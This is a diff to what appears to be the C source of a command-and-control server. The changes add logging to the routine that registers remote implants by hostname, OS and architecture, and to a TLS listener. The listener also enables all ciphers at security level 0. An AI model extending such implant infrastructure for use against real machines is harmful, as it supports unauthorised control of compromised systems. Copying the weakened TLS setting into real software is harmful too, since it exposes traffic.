@@ -53,12 +53,15 @@ void ssl_register_agent(cJSON *json, char* ip, SSL *ssl) {
     cJSON *arch = cJSON_GetObjectItem(json, "arch");
 
     char input[255];
-    snprintf(input, sizeof(input), "%s-%s-%s", hostname->valuestring, os->valuestring, arch->valuestring);
+    snprintf(input, sizeof(input), "%s-%s-%s-TCP-SSL", hostname->valuestring, os->valuestring, arch->valuestring);
     char implant_id[65];
     GenerateID(input, implant_id);
 
     // check if id already exists in database
-    if (check_implant_id(implant_id) == 1) goto REPLY;
+    if (check_implant_id(implant_id) == 1) {
+        log_message(LOG_INFO, "Implant ID exists (TCP SSL): implant_id = %s", implant_id);
+        goto REPLY;
+    };
 
 
     log_message(LOG_INFO, "New Implant Registration (TCP SSL): implant_id = %s, hostname = %s, os = %s, arch = %s", implant_id,  hostname->valuestring, os->valuestring, arch->valuestring);
@@ -185,7 +188,7 @@ void* tcp_ssl_listener(void *args) {
 
     // create TCP socket
     int serverSock = socket(AF_INET, SOCK_STREAM, 0);
-    if (serverSock < 0) { perror("Socket creation failed"); return NULL; }
+    if (serverSock < 0) { log_message(LOG_ERROR, "Socket creation failed (TCP, SSL)"); return NULL; }
 
     struct sockaddr_in addr = {0};
     addr.sin_family = AF_INET;
@@ -193,17 +196,17 @@ void* tcp_ssl_listener(void *args) {
     addr.sin_port = htons(PORT);
 
     if (bind(serverSock, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
-        perror("Bind failed"); close(serverSock); return NULL;
+        log_message(LOG_ERROR, "Binding Failed | Port : %d", PORT); close(serverSock); return NULL;
     }
 
     if (listen(serverSock, SOMAXCONN) < 0) {
-        perror("Listen failed"); close(serverSock); return NULL;
+       log_message(LOG_ERROR, "Listen failed | Port : %d", PORT); close(serverSock); return NULL;
     }
 
     // SSL context
     const SSL_METHOD *method = TLS_server_method();
     SSL_CTX *ctx = SSL_CTX_new(method);
-    if (!ctx) { perror("SSL_CTX_new failed"); return NULL; }
+    if (!ctx) { log_message(LOG_ERROR, "Failed to create SSL ctx "); return NULL; }
     SSL_CTX_set_cipher_list(ctx, "ALL:@SECLEVEL=0"); // debugging only
 
     if (SSL_CTX_use_certificate_file(ctx, cert, SSL_FILETYPE_PEM) <= 0 ||
